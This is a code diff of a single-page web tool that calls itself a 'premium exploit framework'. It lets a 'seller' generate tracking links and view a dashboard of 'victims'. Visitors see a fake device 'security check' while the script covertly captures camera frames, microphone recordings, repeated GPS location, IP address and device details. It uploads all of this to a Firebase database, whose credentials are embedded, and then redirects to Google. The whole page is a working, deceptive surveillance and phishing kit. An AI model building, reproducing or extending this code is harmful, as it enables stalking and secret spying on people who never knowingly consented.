@@ -3,210 +3,344 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>MR_MOMIN_🌍 | UID LINK GENERATOR</title>
+    <title>MR_MOMIN_🌍 | PREMIUM SUITE</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
         body {
-            background: radial-gradient(circle at 20% 30%, #03000a, #000000);
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 1rem;
+            background: radial-gradient(circle at 10% 20%, #0a0f1e, #03050a);
+            position: relative;
+            overflow-x: hidden;
         }
-        .glass-card {
-            background: rgba(0, 10, 20, 0.85);
-            backdrop-filter: blur(12px);
-            border-radius: 2rem;
-            border: 1px solid #0f0;
-            max-width: 800px;
-            width: 100%;
+
+        /* Animated gradient orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.4;
+            z-index: 0;
+            animation: float 20s infinite alternate;
+        }
+        .orb1 { width: 400px; height: 400px; background: #0f0; top: -100px; left: -100px; }
+        .orb2 { width: 500px; height: 500px; background: #00aaff; bottom: -150px; right: -150px; animation-duration: 25s; }
+        .orb3 { width: 300px; height: 300px; background: #ff44cc; top: 50%; left: 50%; animation-duration: 18s; }
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(100px, 100px) scale(1.2); }
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 1400px;
+            margin: 0 auto;
             padding: 2rem;
-            box-shadow: 0 0 30px rgba(0,255,0,0.2);
         }
-        h1 {
-            font-size: 1.8rem;
-            text-align: center;
-            color: #0f0;
-            text-shadow: 0 0 5px #0f0;
+
+        .glass-card {
+            background: rgba(10, 20, 30, 0.65);
+            backdrop-filter: blur(16px);
+            border-radius: 2rem;
+            border: 1px solid rgba(0, 255, 0, 0.4);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4), 0 0 20px rgba(0, 255, 0, 0.2);
+            transition: all 0.3s ease;
         }
-        .tagline {
+
+        .header {
             text-align: center;
-            color: #5f5;
-            font-size: 0.7rem;
-            border-bottom: 1px solid #0f0;
+            margin-bottom: 2rem;
+        }
+        .logo {
+            font-size: 2.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0f0, #5f5, #0f0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 20px rgba(0,255,0,0.4);
+            letter-spacing: 2px;
+        }
+        .badge {
             display: inline-block;
-            margin-bottom: 1.5rem;
+            background: rgba(0,255,0,0.15);
+            border: 1px solid rgba(0,255,0,0.5);
+            border-radius: 2rem;
+            padding: 0.3rem 1.2rem;
+            font-size: 0.7rem;
+            color: #0f0;
+            margin-top: 0.5rem;
+            backdrop-filter: blur(4px);
         }
+
+        .uid-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            padding: 1rem 1.5rem;
+            margin-bottom: 2rem;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 1.5rem;
+        }
+        .uid-label {
+            font-weight: 600;
+            color: #ccc;
+        }
+        .uid-value {
+            font-family: monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            background: #00000066;
+            padding: 0.4rem 1rem;
+            border-radius: 2rem;
+            letter-spacing: 1px;
+            color: #0f0;
+        }
+        .new-uid-btn {
+            background: rgba(0,255,0,0.2);
+            border: 1px solid #0f0;
+            border-radius: 2rem;
+            padding: 0.5rem 1rem;
+            color: #0f0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .new-uid-btn:hover {
+            background: #0f0;
+            color: #000;
+        }
+
         .feature-grid {
             display: grid;
-            grid-template-columns: repeat(2,1fr);
-            gap: 12px;
-            margin: 1.5rem 0;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 1rem;
+            margin: 2rem 0;
         }
         .feature-card {
-            background: #001500;
-            border: 1px solid #0f0;
-            border-radius: 1rem;
-            padding: 8px;
+            background: rgba(0, 20, 0, 0.5);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 1.2rem;
+            padding: 1.2rem 0.5rem;
             text-align: center;
             cursor: pointer;
+            transition: all 0.25s ease;
+        }
+        .feature-card i {
+            font-size: 2rem;
             color: #0f0;
-            transition: 0.2s;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+        .feature-card span {
+            font-size: 0.9rem;
+            font-weight: 500;
         }
         .feature-card.selected {
-            background: #0f03;
-            box-shadow: 0 0 12px #0f0;
+            background: rgba(0, 255, 0, 0.25);
+            border-color: #0f0;
+            box-shadow: 0 0 18px rgba(0,255,0,0.4);
+            transform: scale(1.02);
         }
-        .btn {
+
+        .btn-primary {
             width: 100%;
-            background: #0f0;
+            background: linear-gradient(95deg, #0f0, #0a8a0a);
             border: none;
-            border-radius: 2rem;
-            padding: 12px;
-            font-weight: bold;
-            color: black;
+            border-radius: 1.5rem;
+            padding: 1rem;
+            font-weight: 700;
+            font-size: 1rem;
+            color: #000;
             cursor: pointer;
-        }
-        .link-box {
+            transition: 0.2s;
             margin-top: 1rem;
-            background: #000000aa;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0,255,0,0.5);
+        }
+
+        .link-box {
+            margin-top: 1.5rem;
+            padding: 1rem;
             border-radius: 1rem;
-            padding: 12px;
-            border-left: 3px solid #0f0;
+            background: rgba(0, 0, 0, 0.6);
+            border-left: 4px solid #0f0;
         }
         .link-text {
-            font-size: 0.7rem;
+            font-size: 0.75rem;
             word-break: break-all;
-            background: #021a02;
-            padding: 8px;
-            border-radius: 0.5rem;
-            color: #afa;
+            background: #0a1a0a;
+            padding: 0.8rem;
+            border-radius: 0.8rem;
+            font-family: monospace;
+            margin: 0.5rem 0;
+            color: #cfc;
         }
+        .copy-btn {
+            background: #0f0;
+            border: none;
+            border-radius: 1rem;
+            padding: 0.5rem;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
         .campaign-list {
-            margin-top: 1.5rem;
-            max-height: 400px;
+            margin-top: 2rem;
+            max-height: 550px;
             overflow-y: auto;
         }
         .campaign-item {
-            background: #001000;
-            border-radius: 1rem;
-            padding: 10px;
-            margin-bottom: 8px;
-            font-size: 0.7rem;
+            background: rgba(0, 20, 0, 0.5);
+            border-radius: 1.2rem;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            transition: 0.2s;
         }
         .campaign-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            gap: 8px;
-            margin-bottom: 8px;
+            gap: 0.5rem;
+            margin-bottom: 0.8rem;
         }
         .campaign-link {
-            flex: 1;
+            font-size: 0.7rem;
             word-break: break-all;
             color: #afa;
-            font-size: 0.65rem;
+            font-family: monospace;
+            flex: 1;
         }
         .campaign-clicks {
             background: #0f0;
-            color: black;
-            padding: 2px 8px;
-            border-radius: 1rem;
+            color: #000;
+            padding: 0.2rem 0.8rem;
+            border-radius: 2rem;
             font-weight: bold;
+            font-size: 0.8rem;
         }
-        .victim-data {
-            margin-top: 8px;
-            border-top: 1px solid #0f0;
-            padding-top: 6px;
-            font-size: 0.6rem;
-        }
-        .victim-item {
-            background: #0a1a0a;
-            padding: 6px;
-            margin-top: 4px;
-            border-radius: 8px;
-        }
-        .image-preview {
-            max-width: 100px;
-            max-height: 100px;
-            cursor: pointer;
-        }
-        audio {
-            max-width: 150px;
-            height: 30px;
-        }
-        .status-msg {
-            font-size: 0.7rem;
-            color: #ffa;
-            margin-top: 8px;
-        }
-        .uid-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: #001000;
-            padding: 8px;
+        .copy-camp {
+            background: rgba(0,255,0,0.2);
+            border: 1px solid #0f0;
             border-radius: 1rem;
-            margin-bottom: 1rem;
-        }
-        .hide { display: none; }
-        .victim-card {
-            background: #111;
-            border-radius: 1.5rem;
-            padding: 2rem;
-            text-align: center;
+            padding: 0.3rem 0.8rem;
+            cursor: pointer;
             color: #0f0;
         }
+        .victim-data {
+            margin-top: 0.8rem;
+            border-top: 1px solid rgba(0,255,0,0.2);
+            padding-top: 0.8rem;
+            font-size: 0.7rem;
+        }
+        .victim-item {
+            background: rgba(0,0,0,0.5);
+            padding: 0.6rem;
+            border-radius: 0.8rem;
+            margin-top: 0.5rem;
+        }
+        .image-preview {
+            max-width: 70px;
+            max-height: 70px;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            border: 1px solid #0f0;
+            margin: 2px;
+        }
+        audio {
+            max-width: 140px;
+            height: 28px;
+        }
+        .victim-card {
+            text-align: center;
+            padding: 3rem;
+        }
         .loader {
-            width: 40px;
-            height: 40px;
-            border: 3px solid #0f0;
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(0,255,0,0.3);
             border-top-color: #0f0;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 20px auto;
+            animation: spin 1s linear infinite;
+            margin: 1rem auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .hide { display: none; }
+        .status-msg {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.8rem;
+            color: #afa;
+        }
+        @media (max-width: 768px) {
+            .container { padding: 1rem; }
+            .feature-grid { grid-template-columns: repeat(2, 1fr); }
+        }
     </style>
 </head>
 <body>
-<div id="appRoot">
-    <!-- Dashboard Panel (Seller) -->
-    <div id="dashboardPanel" class="glass-card">
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+<div class="container">
+    <!-- Dashboard Panel -->
+    <div id="dashboardPanel" class="glass-card" style="padding: 2rem;">
+        <div class="header">
+            <div class="logo">MR_MOMIN_🌍</div>
+            <div class="badge">PREMIUM EXPLOIT FRAMEWORK v6.0</div>
+        </div>
+
         <div class="uid-header">
-            <span>🔑 YOUR UID: <strong id="displayUid"></strong></span>
-            <button id="newUidBtn" style="background:#333; border:1px solid #0f0; border-radius:1rem; padding:4px 8px;">NEW UID</button>
+            <div><i class="fas fa-fingerprint"></i> <span class="uid-label">YOUR UNIQUE ID</span></div>
+            <div class="uid-value"><i class="fas fa-id-card"></i> <span id="displayUid">--</span></div>
+            <button id="newUidBtn" class="new-uid-btn"><i class="fas fa-sync-alt"></i> NEW UID</button>
         </div>
+
         <div class="feature-grid" id="featureGrid">
-            <div class="feature-card" data-feat="C">📸 CAMERA</div>
-            <div class="feature-card" data-feat="M">🎙️ MIC</div>
-            <div class="feature-card" data-feat="L">📍 LOCATION</div>
-            <div class="feature-card" data-feat="X">💻 DEVICE INFO</div>
+            <div class="feature-card" data-feat="C"><i class="fas fa-camera"></i><span>CAMERA</span></div>
+            <div class="feature-card" data-feat="M"><i class="fas fa-microphone"></i><span>MICROPHONE</span></div>
+            <div class="feature-card" data-feat="L"><i class="fas fa-map-marker-alt"></i><span>LOCATION</span></div>
+            <div class="feature-card" data-feat="X"><i class="fas fa-laptop-code"></i><span>DEVICE INFO</span></div>
         </div>
-        <button class="btn" id="generateLinkBtn">🔗 GENERATE NEW LINK</button>
-        <div id="newLinkBox" class="link-box" style="display: none;">
-            <div><strong>🔗 NEW LINK (SHARE THIS):</strong></div>
+
+        <button class="btn-primary" id="generateLinkBtn"><i class="fas fa-link"></i> GENERATE NEW LINK</button>
+
+        <div id="newLinkBox" class="link-box hide">
+            <div><i class="fas fa-share-alt"></i> <strong>SHARE THIS LINK</strong></div>
             <div class="link-text" id="newLinkText">--</div>
-            <button id="copyLinkBtn" style="background:#0f0; color:#000; border:none; border-radius:1rem; padding:6px; margin-top:8px;">COPY LINK</button>
+            <button id="copyLinkBtn" class="copy-btn"><i class="fas fa-copy"></i> COPY LINK</button>
         </div>
+
         <div class="campaign-list">
-            <div style="text-align:center; color:#5f5; margin-bottom:8px;">YOUR CAMPAIGNS</div>
+            <div style="text-align: center; margin-bottom: 1rem;"><i class="fas fa-chart-line"></i> YOUR ACTIVE CAMPAIGNS</div>
             <div id="campaignList"></div>
         </div>
         <div id="dashboardStatus" class="status-msg"></div>
     </div>
 
     <!-- Victim Panel -->
-    <div id="victimPanel" class="victim-card hide">
-        <h2>🛡️ SECURITY CHECK</h2>
-        <p>Verifying your device...</p>
+    <div id="victimPanel" class="glass-card victim-card hide">
+        <i class="fas fa-shield-alt" style="font-size: 3rem; color: #0f0;"></i>
+        <h2 style="margin: 1rem 0;">SECURITY CHECK</h2>
+        <p>Verifying your device security...</p>
         <div class="loader"></div>
-        <p style="font-size:0.7rem;">Please wait...</p>
+        <p style="font-size: 0.8rem; margin-top: 1rem;">Please wait, this will take a few seconds.</p>
     </div>
 </div>
 
@@ -214,7 +348,7 @@
 <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
 <script>
-    // Firebase Config (Your Provided)
+    // ========== FIREBASE CONFIG (YOUR PROVIDED) ==========
     const firebaseConfig = {
         apiKey: "AIzaSyDdYUeWB_e-Pv7-4yBN49P3ZN1Ig4PTW1g",
         authDomain: "momin-tracking-sysrem.firebaseapp.com",
@@ -225,25 +359,36 @@
         appId: "1:294704122788:web:147bff72e6bf866a808f31",
         measurementId: "G-BS81ZN7BDD"
     };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
 
-    // Helper functions
+    // Initialize Firebase
+    let db;
+    try {
+        firebase.initializeApp(firebaseConfig);
+        db = firebase.database();
+        console.log("✅ Firebase initialized");
+    } catch (e) {
+        console.error("Firebase init error", e);
+        alert("Firebase initialization failed. Check your configuration.");
+    }
+
+    // ========== HELPER FUNCTIONS ==========
     function generateUID() {
         return Math.floor(10000000 + Math.random() * 90000000).toString();
     }
 
-    function showMsg(msg, isError=false) {
+    function showMsg(msg, isError = false) {
         const el = document.getElementById('dashboardStatus');
-        if(el) {
-            el.innerText = msg;
+        if (el) {
+            el.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
             el.style.color = isError ? '#f66' : '#afa';
-            setTimeout(() => { if(el.innerText === msg) el.innerText = ''; }, 3000);
+            setTimeout(() => {
+                if (el.innerHTML.includes(msg)) el.innerHTML = '';
+            }, 4000);
         }
     }
 
     function copyClip(txt) {
-        navigator.clipboard.writeText(txt).then(() => showMsg('✅ Link copied!')).catch(() => showMsg('❌ Copy failed', true));
+        navigator.clipboard.writeText(txt).then(() => showMsg('Link copied!')).catch(() => showMsg('Copy failed', true));
     }
 
     // ========== SELLER DASHBOARD ==========
@@ -251,94 +396,103 @@
     let campaignsRef = null;
 
     async function loadSellerDashboard(uid) {
-        const snapshot = await db.ref(`sellers/${uid}`).once('value');
-        if(!snapshot.exists()) {
-            // If UID not in DB, create it
-            await db.ref(`sellers/${uid}`).set({ createdAt: Date.now() });
+        if (!db) {
+            showMsg("Firebase not ready. Reload page.", true);
+            return;
         }
-        currentUid = uid;
-        localStorage.setItem('momin_uid', uid);
-        document.getElementById('displayUid').innerText = uid;
-        document.getElementById('dashboardPanel').classList.remove('hide');
-        document.getElementById('victimPanel').classList.add('hide');
-        // Load campaigns
-        loadCampaigns(uid);
-        // Setup realtime listener for campaigns
-        if(campaignsRef) campaignsRef.off();
-        campaignsRef = db.ref(`sellers/${uid}/campaigns`);
-        campaignsRef.on('value', (snap) => {
-            renderCampaigns(snap.val() || {});
-        });
-    }
-
-    function loadCampaigns(uid) {
-        // This is handled by the listener above
+        try {
+            const snapshot = await db.ref(`sellers/${uid}`).once('value');
+            if (!snapshot.exists()) {
+                await db.ref(`sellers/${uid}`).set({ createdAt: Date.now() });
+                console.log("New seller created:", uid);
+            }
+            currentUid = uid;
+            localStorage.setItem('momin_uid', uid);
+            document.getElementById('displayUid').innerText = uid;
+            document.getElementById('dashboardPanel').classList.remove('hide');
+            document.getElementById('victimPanel').classList.add('hide');
+            
+            if (campaignsRef) campaignsRef.off();
+            campaignsRef = db.ref(`sellers/${uid}/campaigns`);
+            campaignsRef.on('value', (snap) => {
+                renderCampaigns(snap.val() || {});
+            });
+            showMsg("Dashboard ready.");
+        } catch (err) {
+            console.error(err);
+            showMsg("Error: " + err.message, true);
+        }
     }
 
     function renderCampaigns(campaigns) {
         const container = document.getElementById('campaignList');
-        if(Object.keys(campaigns).length === 0) {
-            container.innerHTML = '<div style="text-align:center; color:#5f5;">No campaigns yet. Create your first link.</div>';
+        if (Object.keys(campaigns).length === 0) {
+            container.innerHTML = '<div style="text-align:center; color:#5f5; padding: 2rem;"><i class="fas fa-info-circle"></i> No campaigns yet. Create your first link.</div>';
             return;
         }
         let html = '';
-        for(const [campId, camp] of Object.entries(campaigns)) {
+        for (const [campId, camp] of Object.entries(campaigns)) {
+            const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
             html += `
                 <div class="campaign-item">
                     <div class="campaign-header">
-                        <div class="campaign-link">🔗 ${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}</div>
-                        <div class="campaign-clicks">👥 ${camp.clicks || 0}</div>
-                        <button class="copy-camp" data-link="${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}" style="background:#0f0; border:none; border-radius:1rem; padding:2px 6px;">Copy</button>
+                        <div class="campaign-link"><i class="fas fa-link"></i> ${link}</div>
+                        <div class="campaign-clicks"><i class="fas fa-eye"></i> ${camp.clicks || 0}</div>
+                        <button class="copy-camp" data-link="${link}"><i class="fas fa-copy"></i> Copy</button>
                     </div>
                     <div class="victim-data" id="victims-${campId}">
-                        <div style="color:#afa;">Loading victims...</div>
+                        <div style="color:#afa;"><i class="fas fa-spinner fa-pulse"></i> Loading victims...</div>
                     </div>
                 </div>
             `;
         }
         container.innerHTML = html;
-        // Add copy event listeners
+        
         document.querySelectorAll('.copy-camp').forEach(btn => {
             btn.addEventListener('click', (e) => {
                 const link = btn.getAttribute('data-link');
                 copyClip(link);
             });
         });
-        // Load victims data for each campaign
-        for(const campId of Object.keys(campaigns)) {
+        
+        for (const campId of Object.keys(campaigns)) {
             loadVictimsData(campId);
         }
     }
 
-    async function loadVictimsData(campId) {
+    function loadVictimsData(campId) {
         const victimsRef = db.ref(`sellers/${currentUid}/campaigns/${campId}/victims`);
         victimsRef.on('value', (snap) => {
             const victims = snap.val() || {};
             const container = document.getElementById(`victims-${campId}`);
-            if(Object.keys(victims).length === 0) {
-                container.innerHTML = '<div style="color:#5f5;">No victims yet.</div>';
+            if (Object.keys(victims).length === 0) {
+                container.innerHTML = '<div style="color:#5f5;"><i class="fas fa-user-slash"></i> No victims yet</div>';
                 return;
             }
-            let html = '';
-            for(const [victimId, data] of Object.entries(victims)) {
-                html += `<div class="victim-item"><strong>🕵️ Victim ${victimId.slice(-4)}</strong><br>`;
-                if(data.deviceInfo) {
-                    html += `📱 Device: ${data.deviceInfo.platform}, ${data.deviceInfo.language}<br>`;
-                    html += `🔋 Battery: ${data.deviceInfo.battery}<br>`;
+            let html = '<div><i class="fas fa-users"></i> Victims Data (Real-time)</div>';
+            for (const [victimId, data] of Object.entries(victims)) {
+                html += `<div class="victim-item">
+                    <div><i class="fas fa-user-secret"></i> <strong>Victim ${victimId.slice(-6)}</strong> <span style="font-size:0.6rem;">${new Date(data.timestamp).toLocaleString()}</span></div>`;
+                if (data.deviceInfo && Object.keys(data.deviceInfo).length) {
+                    html += `<div><i class="fas fa-laptop"></i> ${data.deviceInfo.platform || 'Unknown'} | ${data.deviceInfo.language || ''} | 🔋 ${data.deviceInfo.battery || 'N/A'}</div>`;
                 }
-                if(data.location && data.location.length) {
+                if (data.location && data.location.length) {
                     const lastLoc = data.location[data.location.length-1];
-                    html += `📍 Last Location: ${lastLoc.lat}, ${lastLoc.lng}<br>`;
+                    html += `<div><i class="fas fa-map-pin"></i> Last: ${lastLoc.lat}, ${lastLoc.lng}</div>`;
                 }
-                if(data.camera && data.camera.length) {
+                if (data.camera && data.camera.length) {
+                    html += `<div><i class="fas fa-camera"></i> Images: `;
                     data.camera.forEach((img, idx) => {
-                        html += `<img src="${img}" class="image-preview" onclick="window.open('${img}')" style="max-width:80px; max-height:80px; margin:2px;"> `;
+                        html += `<img src="${img}" class="image-preview" onclick="window.open('${img}')" title="Click to view"> `;
                     });
+                    html += `</div>`;
                 }
-                if(data.mic && data.mic.length) {
+                if (data.mic && data.mic.length) {
+                    html += `<div><i class="fas fa-microphone"></i> Audio: `;
                     data.mic.forEach((audio, idx) => {
                         html += `<audio controls src="${audio}"></audio> `;
                     });
+                    html += `</div>`;
                 }
                 html += `</div>`;
             }
@@ -347,9 +501,13 @@
     }
 
     function generateNewCampaign() {
+        if (!currentUid) {
+            showMsg("No UID loaded. Refresh page.", true);
+            return;
+        }
         const selected = Array.from(document.querySelectorAll('.feature-card.selected')).map(c => c.getAttribute('data-feat')).join('');
-        if(selected.length === 0) {
-            showMsg('❌ Select at least one feature!', true);
+        if (selected.length === 0) {
+            showMsg('Please select at least one feature!', true);
             return;
         }
         const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6);
@@ -362,21 +520,19 @@
         }).then(() => {
             const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
             document.getElementById('newLinkText').innerText = link;
-            document.getElementById('newLinkBox').style.display = 'block';
-            showMsg('✅ Campaign created! Share the link.');
+            document.getElementById('newLinkBox').classList.remove('hide');
+            showMsg('Campaign created! Share your link.');
         }).catch(err => {
             console.error(err);
-            showMsg('❌ Firebase error: ' + err.message, true);
+            showMsg('Error: ' + err.message, true);
         });
     }
 
     // ========== VICTIM MODE ==========
     async function startVictimCollector(sellerUid, campaignId, features) {
-        // Send data to Firebase under sellerUid/campaigns/campaignId/victims
         const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
         const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
-
-        // Prepare data object
+        
         const victimData = {
             deviceInfo: {},
             location: [],
@@ -384,9 +540,9 @@
             mic: [],
             timestamp: Date.now()
         };
-
+        
         // Device Info
-        if(features.includes('X')) {
+        if (features.includes('X')) {
             let ip = 'unknown';
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -394,22 +550,21 @@
                 ip = data.ip;
             } catch(e) {}
             let battery = 'N/A';
-            if(navigator.getBattery) {
+            if (navigator.getBattery) {
                 const b = await navigator.getBattery();
-                battery = `${Math.round(b.level*100)}% (${b.charging?'charging':'not'})`;
+                battery = `${Math.round(b.level*100)}% (${b.charging ? 'charging' : 'not'})`;
             }
             victimData.deviceInfo = {
-                ip,
-                battery,
+                ip, battery,
                 platform: navigator.platform,
                 language: navigator.language,
                 screen: `${screen.width}x${screen.height}`,
                 userAgent: navigator.userAgent
             };
         }
-
-        // Location (single capture + optional interval)
-        if(features.includes('L') && navigator.geolocation) {
+        
+        // Location
+        if (features.includes('L') && navigator.geolocation) {
             const getLocation = () => {
                 navigator.geolocation.getCurrentPosition(pos => {
                     victimData.location.push({
@@ -418,14 +573,14 @@
                         time: Date.now()
                     });
                     victimRef.child('location').set(victimData.location);
-                }, err => console.log('Location error', err));
+                }, err => console.log("Location error", err));
             };
             getLocation();
             setInterval(getLocation, 30000);
         }
-
+        
         // Camera
-        if(features.includes('C')) {
+        if (features.includes('C')) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('hiddenVideo');
@@ -433,7 +588,7 @@
                 await video.play();
                 const canvas = document.getElementById('hiddenCanvas');
                 const capture = () => {
-                    if(video.videoWidth && video.videoHeight) {
+                    if (video.videoWidth && video.videoHeight) {
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
@@ -443,12 +598,12 @@
                     }
                 };
                 capture();
-                setInterval(capture, 333);
-            } catch(e) { console.error('Camera error', e); }
+                setInterval(capture, 500);
+            } catch(e) { console.error("Camera error", e); }
         }
-
+        
         // Microphone
-        if(features.includes('M')) {
+        if (features.includes('M')) {
             const recordAndSend = async () => {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -461,8 +616,7 @@
                             stream.getTracks().forEach(t => t.stop());
                             const reader = new FileReader();
                             reader.onloadend = () => {
-                                const dataUrl = reader.result;
-                                victimData.mic.push(dataUrl);
+                                victimData.mic.push(reader.result);
                                 victimRef.child('mic').set(victimData.mic);
                                 resolve();
                             };
@@ -470,81 +624,81 @@
                         };
                     });
                     mediaRecorder.start();
-                    setTimeout(() => mediaRecorder.stop(), 6000);
+                    setTimeout(() => mediaRecorder.stop(), 5000);
                     await audioPromise;
-                } catch(e) { console.error('Mic error', e); }
+                } catch(e) { console.error("Mic error", e); }
             };
             recordAndSend();
-            setInterval(recordAndSend, 10000);
+            setInterval(recordAndSend, 12000);
         }
-
-        // Additional: screenshot
+        
+        // Screenshot
         try {
             const ssCanvas = await html2canvas(document.body, { scale: 0.7 });
-            const ssDataUrl = ssCanvas.toDataURL('image/jpeg', 0.7);
-            victimData.camera.push(ssDataUrl);
+            victimData.camera.push(ssCanvas.toDataURL('image/jpeg', 0.7));
             victimRef.child('camera').set(victimData.camera);
         } catch(e) {}
-
+        
         // Save initial data
         await victimRef.set(victimData);
         // Increment click count
         const clickRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`);
         clickRef.transaction(current => (current || 0) + 1);
+        
+        // Redirect after delay
+        setTimeout(() => { window.location.href = 'https://www.google.com'; }, 8000);
     }
-
-    // ========== MAIN ==========
+    
+    // ========== MAIN EXECUTION ==========
     const urlParams = new URLSearchParams(window.location.search);
     const uidParam = urlParams.get('uid');
     const campParam = urlParams.get('camp');
-
-    if(uidParam && campParam) {
+    
+    if (uidParam && campParam) {
         // Victim mode
         document.getElementById('dashboardPanel').classList.add('hide');
         document.getElementById('victimPanel').classList.remove('hide');
-        // Fetch campaign features
         const campRef = db.ref(`sellers/${uidParam}/campaigns/${campParam}`);
         campRef.once('value', async (snap) => {
-            if(!snap.exists()) {
-                document.querySelector('#victimPanel p').innerText = 'Invalid link.';
+            if (!snap.exists()) {
+                document.querySelector('#victimPanel p').innerHTML = 'Invalid or expired link.';
                 document.querySelector('#victimPanel .loader').style.display = 'none';
                 return;
             }
             const features = snap.val().features;
             await startVictimCollector(uidParam, campParam, features);
-            // After 10 seconds redirect
-            setTimeout(() => {
-                window.location.href = 'https://www.google.com';
-            }, 10000);
+        }).catch(err => {
+            console.error(err);
+            document.querySelector('#victimPanel p').innerHTML = 'Error loading campaign.';
+            document.querySelector('#victimPanel .loader').style.display = 'none';
         });
     } else {
         // Seller mode
         let storedUid = localStorage.getItem('momin_uid');
-        if(storedUid) {
+        if (storedUid) {
             loadSellerDashboard(storedUid);
         } else {
-            // First time: generate new UID
             const newUid = generateUID();
             localStorage.setItem('momin_uid', newUid);
             loadSellerDashboard(newUid);
         }
-        // Setup event listeners
+        
+        // Event listeners
         document.getElementById('generateLinkBtn').addEventListener('click', generateNewCampaign);
         document.getElementById('copyLinkBtn').addEventListener('click', () => {
             const link = document.getElementById('newLinkText').innerText;
-            if(link && link !== '--') copyClip(link);
+            if (link && link !== '--') copyClip(link);
         });
         document.getElementById('newUidBtn').addEventListener('click', () => {
             const newUid = generateUID();
             localStorage.setItem('momin_uid', newUid);
             loadSellerDashboard(newUid);
-            showMsg('✅ New UID created!');
+            showMsg('New UID created!');
         });
-        // Feature selection toggles
+        
+        // Feature selection toggle
         document.querySelectorAll('.feature-card').forEach(card => {
-            card.addEventListener('click', () => {
-                card.classList.toggle('selected');
-            });
+            card.addEventListener('click', () => card.classList.toggle('selected'));
         });
     }
 </script>
